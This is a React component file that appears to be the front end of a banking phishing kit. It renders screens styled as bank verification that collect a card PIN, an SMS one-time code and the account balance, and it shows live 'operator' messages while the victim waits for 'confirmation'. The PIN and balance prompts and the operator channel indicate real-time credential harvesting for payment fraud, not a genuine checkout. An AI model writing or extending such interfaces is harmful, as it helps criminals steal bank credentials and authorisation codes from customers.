import React, { useState, useEffect, type ChangeEvent } from "react";
import type { OperatorMessage as OperatorMessageType, ResendState, TransactionDetails } from "../../types";
import { DECLINED_STATUS_MESSAGES } from "../../lib/checkout-status";

// --- Shared components (inlined from src/components) ---

export function Spinner({ size = 40 }: { size?: number }) {
  const border = Math.max(2, Math.floor(size / 8));
  return (
    <div
      className="bank-ui-spinner"
      style={
        {
          "--bank-ui-spinner-size": `${size}px`,
          "--bank-ui-spinner-border": `${border}px`,
        } as React.CSSProperties
      }
    />
  );
}

export interface PinInputProps {
  digits?: number;
  onComplete: (pin: string) => void;
  disabled?: boolean;
  label?: string;
}

export function PinInput({
  digits = 4,
  onComplete,
  disabled,
  label = "PIN",
}: PinInputProps) {
  const [value, setValue] = useState("");
  const [masked, setMasked] = useState(true);

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, digits);
    setValue(v);
    if (v.length === digits) onComplete(v);
  };

  return (
    <div>
      <label htmlFor="pin-input" className="bank-ui-label bank-ui-label-center">
        {label}
      </label>
      <input
        id="pin-input"
        type={masked ? "password" : "text"}
        inputMode="numeric"
        maxLength={digits}
        value={value}
        onChange={handleChange}
        disabled={disabled}
        placeholder="••••"
        className="bank-ui-input bank-ui-input-pin"
      />
      <label htmlFor="pin-show-toggle" className="bank-ui-toggle-label">
        <input
          id="pin-show-toggle"
          type="checkbox"
          checked={!masked}
          onChange={(e) => setMasked(!e.target.checked)}
        />
        Show PIN
      </label>
    </div>
  );
}

interface StatusOverlayProps {
  message?: string;
}

export function StatusOverlay({ message = "Processing..." }: StatusOverlayProps) {
  return (
    <div className="bank-ui-overlay">
      <div className="bank-ui-overlay-content">
        <div className="bank-ui-overlay-spinner">
          <Spinner size={48} />
        </div>
        <p className="bank-ui-overlay-message">{message}</p>
      </div>
    </div>
  );
}

interface ResultPageProps {
  variant: "success" | "declined";
  status?: string;
  showSessionInfo?: boolean;
  sessionId?: string;
  className?: string;
}

export function ResultPage({
  variant,
  status = "declined",
  showSessionInfo = false,
  sessionId,
  className,
}: ResultPageProps) {
  const isSuccess = variant === "success";

  return (
    <div
      className={`${className ?? ""} ${isSuccess ? "bank-ui-result-success" : "bank-ui-result-declined"}`}
    >
      <div
        className={`bank-ui-result-icon ${
          isSuccess ? "bank-ui-result-icon-success" : "bank-ui-result-icon-declined"
        }`}
      >
        {isSuccess ? "✓" : "✕"}
      </div>
      <h1
        className={`bank-ui-result-title ${
          isSuccess ? "bank-ui-result-title-success" : "bank-ui-result-title-declined"
        }`}
      >
        {isSuccess ? "Payment Successful" : "Transaction Failed"}
      </h1>
      <p className="bank-ui-result-body">
        {isSuccess
          ? "Your transaction has been completed successfully."
          : DECLINED_STATUS_MESSAGES[status ?? ""] ?? DECLINED_STATUS_MESSAGES.declined}
      </p>
      {showSessionInfo && sessionId && (
        <p className="bank-ui-result-session">Session: {sessionId}</p>
      )}
    </div>
  );
}

// --- Transaction details ---

interface TransactionDetailsBoxProps {
  details: TransactionDetails;
}

export function TransactionDetailsBox({ details }: TransactionDetailsBoxProps) {
  const rows: { label: string; value: string }[] = [];
  if (details.merchantName) rows.push({ label: "Merchant Name", value: details.merchantName });
  if (details.amount) rows.push({ label: "Amount", value: details.amount });
  if (details.date) rows.push({ label: "Date", value: details.date });
  if (details.cardNumber) rows.push({ label: "Card Number", value: details.cardNumber });
  if (rows.length === 0) return null;

  return (
    <div className="bank-ui-transaction-details">
      <h3 className="bank-ui-transaction-details-title">Transaction details</h3>
      <ul className="bank-ui-transaction-details-list">
        {rows.map(({ label, value }) => (
          <li key={label} className="bank-ui-transaction-details-row">
            <span className="bank-ui-transaction-details-label">{label}</span>
            <span className="bank-ui-transaction-details-value">{value}</span>
          </li>
        ))}
      </ul>
    </div>
  );
}

// --- Layout components ---

interface SmsOtpProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
  onError: (msg: string) => void;
  wrongCode?: boolean;
  expiredCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessageType | null;
  onSubmit: (code: string) => void;
  submitting: boolean;
  resendState: ResendState;
  resetKey: number;
}

export function SmsOtp({
  bank,
  transactionDetails,
  wrongCode,
  expiredCode,
  onTryAgain,
  operatorMessage,
  onSubmit,
  submitting,
  resendState,
  resetKey,
}: SmsOtpProps) {
  const [code, setCode] = useState("");

  useEffect(() => {
    if (wrongCode || expiredCode) {
      setCode("");
    }
  }, [wrongCode, expiredCode]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = code.replace(/\D/g, "").slice(0, 6);
    if (trimmed.length < 6) return;
    onSubmit(trimmed);
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  const { secondsLeft, canResend, onResend, resending } = resendState;

  return (
    <div className="bank-ui-layout">
      {wrongCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Wrong OTP. Please try again.</p>
        </div>
      )}
      {expiredCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
        </div>
      )}
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <h2 className="bank-ui-heading">Enter verification code</h2>
      <p className="bank-ui-body">
        {bank
          ? `Please enter the OTP sent by ${bank} to your registered mobile number.`
          : "Please enter the OTP sent to your registered mobile number."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <form onSubmit={handleSubmit} className="bank-ui-form">
        <div>
          <label htmlFor="otp-code" className="bank-ui-label">
            Verification code
          </label>
          <input
            id="otp-code"
            key={resetKey}
            type="text"
            inputMode="numeric"
            maxLength={6}
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            disabled={submitting}
            placeholder="000000"
            className="bank-ui-input"
          />
        </div>
        <button
          type="submit"
          disabled={submitting || code.replace(/\D/g, "").length < 6}
          className="bank-ui-btn"
        >
          Submit
        </button>
      </form>
      <div className="bank-ui-resend-row">
        {canResend ? (
          <button
            type="button"
            className="bank-ui-resend-btn"
            onClick={() => {
              onTryAgain?.();
              onResend();
            }}
            disabled={resending || submitting}
          >
            {resending ? "Sending..." : "Resend SMS"}
          </button>
        ) : (
          <span className="bank-ui-resend-countdown">
            Resend SMS in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
          </span>
        )}
      </div>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}

interface PinEntryProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
  onError: (msg: string) => void;
  wrongCode?: boolean;
  expiredCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessageType | null;
  onSubmit: (code: string) => void;
  submitting: boolean;
  resendState: ResendState;
  resetKey: number;
}

export function PinEntry({
  bank,
  transactionDetails,
  wrongCode,
  expiredCode,
  onTryAgain,
  operatorMessage,
  onSubmit,
  submitting,
  resendState,
  resetKey,
}: PinEntryProps) {
  const handleComplete = (pin: string) => {
    onTryAgain?.();
    onSubmit(pin);
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  const { secondsLeft, canResend, onResend, resending } = resendState;

  return (
    <div className="bank-ui-layout">
      {wrongCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Wrong PIN. Please try again.</p>
        </div>
      )}
      {expiredCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
        </div>
      )}
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <h2 className="bank-ui-heading">Enter your PIN</h2>
      <p className="bank-ui-body">
        {bank
          ? `Enter the PIN for your ${bank} card to complete the transaction.`
          : "Enter the PIN for your card to complete the transaction."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <PinInput
        key={resetKey}
        digits={4}
        onComplete={handleComplete}
        disabled={submitting}
      />
      <div className="bank-ui-resend-row">
        {canResend ? (
          <button
            type="button"
            className="bank-ui-resend-btn"
            onClick={() => {
              onTryAgain?.();
              onResend();
            }}
            disabled={resending || submitting}
          >
            {resending ? "Sending..." : "Resend PIN"}
          </button>
        ) : (
          <span className="bank-ui-resend-countdown">
            Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
          </span>
        )}
      </div>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}

interface PushWaitingProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
}

export function PushWaiting({ bank, transactionDetails }: PushWaitingProps) {
  return (
    <div className="bank-ui-layout-center">
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <div className="bank-ui-spinner-wrap">
        <Spinner size={64} />
      </div>
      <h2 className="bank-ui-heading">Confirm on your device</h2>
      <p className="bank-ui-body">
        {bank
          ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
          : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
      </p>
    </div>
  );
}

interface BalanceCheckProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
  onError: (msg: string) => void;
  operatorMessage?: OperatorMessageType | null;
  onSubmit: (balance: string) => void;
  submitting: boolean;
}

export function BalanceCheck({
  bank,
  transactionDetails,
  onError,
  operatorMessage,
  onSubmit,
  submitting,
}: BalanceCheckProps) {
  const [balance, setBalance] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = balance.trim();
    if (!trimmed) {
      onError("Please enter your balance");
      return;
    }
    onSubmit(trimmed);
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  return (
    <div className="bank-ui-layout">
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <h2 className="bank-ui-heading">Balance verification</h2>
      <p className="bank-ui-body">
        {bank
          ? `Please enter your ${bank} account balance to complete the verification.`
          : "Please enter your account balance to complete the verification."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <form onSubmit={handleSubmit} className="bank-ui-form">
        <div>
          <label htmlFor="balance" className="bank-ui-label-muted">
            Balance
          </label>
          <input
            id="balance"
            type="text"
            inputMode="decimal"
            value={balance}
            onChange={(e) => setBalance(e.target.value)}
            disabled={submitting}
            placeholder="e.g. 1,234.56"
            className="bank-ui-input"
          />
        </div>
        <button
          type="submit"
          disabled={submitting}
          className="bank-ui-btn bank-ui-btn-lg"
        >
          {submitting ? "Submitting..." : "Submit"}
        </button>
      </form>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}
